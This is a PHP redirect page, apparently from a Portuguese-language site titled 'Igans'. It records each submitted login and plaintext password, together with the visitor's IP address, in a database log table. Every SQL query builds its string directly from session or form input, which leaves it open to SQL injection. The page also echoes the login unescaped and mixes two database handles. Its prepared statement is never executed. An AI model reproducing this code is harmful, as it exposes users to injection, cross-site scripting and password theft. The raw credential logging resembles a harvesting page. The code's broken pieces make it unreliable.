<?php 
		include "pisem3k000.php" ; 
		$login_user = $_SESSION['login_session_user'];
		$senha_user = $_SESSION['senha_session_user'];
		//$sql_user = mysqli_query("SELECT * FROM `pisem_b0009cd` where login = '$login_user' AND senha = '$senha_user'");
		$stmt = $conn->prepare("SELECT * FROM pisem_b0009cd WHERE login = '$login_user' AND senha = '$senha_user'");
?>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Igans</title>
    <link rel="stylesheet" href="css/css01.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
    <link rel="stylesheet" href="css/pisem_css01.min.css">
    <link rel="stylesheet" href="css/pisem_css02.min.css">
    <link rel="stylesheet" href="css/pisem_css07.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
    <link rel="stylesheet" href="css/pisem_css08.css">
</head>

<body class="bounce animated login-dark">
<div>		 
	<div class="bounce animated login-dark" style="background-color: #FF7E04; color: rgb(170,174,177); background-image: url(img01/bmath.jpg)">
		<form method="post" action=".php" style="background-color: rgb(255,174,004); ">
		<center><h2>Redirecionando</h2><br> 
		<div><a href="index.php"><img src="img01/logo_r15.png" /></a></div><br><br>
		<b>Logado como: </b> <?php echo $login_user; ?><br><br></b><br><br><br></center>
		<center><img style="background-color: rgb(255,174,004)" src="img01/gif_loader4.gif" width="30" /  </center>
		</form>
	</div>
					<?php
					$login = $_POST['login'];
					$senha = $_POST['senha'];
					$ipuser =  getenv("remote_ADDR"); 
					$data  = date('Y-m-d H:i:s');
					
					$sql_logs = $mysqli->query("SELECT * FROM pisem_b0009cd where login='$login'");
						while($logs = mysqli_fetch_array($sql_logs)) {
						$iduser 	= $logs['id'];
					} 
					
					$sql = $mysqli->query("INSERT INTO pisem_b0032cd (data, login, tancospass, ip, user) 
					VALUE ('$data', '$login', '$senha', '$ipuser', '$iduser')");
					
					echo "<meta http-equiv='refresh' content='0, url=pisem3k007.php'>";
					?>
					
				</div>
	<script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>
</html>
 

